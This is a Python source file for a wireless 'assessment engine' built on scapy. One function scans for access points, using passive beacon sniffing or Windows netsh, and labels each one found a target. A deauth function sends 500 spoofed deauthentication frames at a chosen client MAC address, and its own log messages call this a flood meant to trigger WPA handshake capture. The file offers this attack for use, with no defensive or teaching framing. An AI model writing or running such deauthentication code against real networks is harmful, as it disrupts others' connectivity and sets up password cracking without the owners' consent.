import platform
import subprocess

class WiFiEngine:
    """Industrial Wireless Assessment Engine with Multi-Platform Fallback"""
    def __init__(self, colors=None):
        self.aps = []
        self.colors = colors or {
            "accent_blue": "#0000FF",
            "critical": "#FF0000"
        }

    def scan_aps(self, interface, callback=None, duration=10):
        # Professional fallback: If scapy/monitor fails, use OS native tools
        if platform.system() == "Windows":
            if callback: callback("WIFI: Monitor mode unavailable. Falling back to netsh reconnaissance...", self.colors.get("accent_blue"))
            try:
                out = subprocess.check_output("netsh wlan show networks mode=bssid", shell=True).decode()
                if callback: callback("[WIFI] Raw spectral data captured via netsh.")
            except: pass
        
        try:
            from scapy.all import sniff, Dot11Beacon, Dot11, Dot11Elt
            if callback: callback(f"WIFI: Passive sniffing active on {interface}...")
            
            def _pkt_callback(pkt):
                if pkt.haslayer(Dot11Beacon):
                    bssid = pkt[Dot11].addr2
                    ssid = pkt[Dot11Elt].info.decode(errors='ignore') if pkt[Dot11Elt].info else "HIDDEN"
                    if not any(a['bssid'] == bssid for a in self.aps):
                        self.aps.append({'ssid': ssid, 'bssid': bssid})
                        if callback: callback(f"TARGET_IDENTIFIED: {ssid} [{bssid}]")

            sniff(iface=interface, prn=_pkt_callback, timeout=duration, store=0)
        except Exception as e:
            if callback: callback(f"WIFI_ERROR: {e}")

    def deauth(self, target_mac, gateway_mac, interface, callback=None):
        try:
            from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
            pkt = RadioTap()/Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)/Dot11Deauth()
            if callback: callback(f"WIFI: Executing deauth flood against {target_mac}...", self.colors.get("critical"))
            sendp(pkt, iface=interface, count=500, inter=0.05, verbose=False)
            if callback: callback("WIFI: Flood sequence complete. Handshake capture phase likely triggered.")
        except Exception as e:
            if callback: callback(f"WIFI_FATAL: {e}")
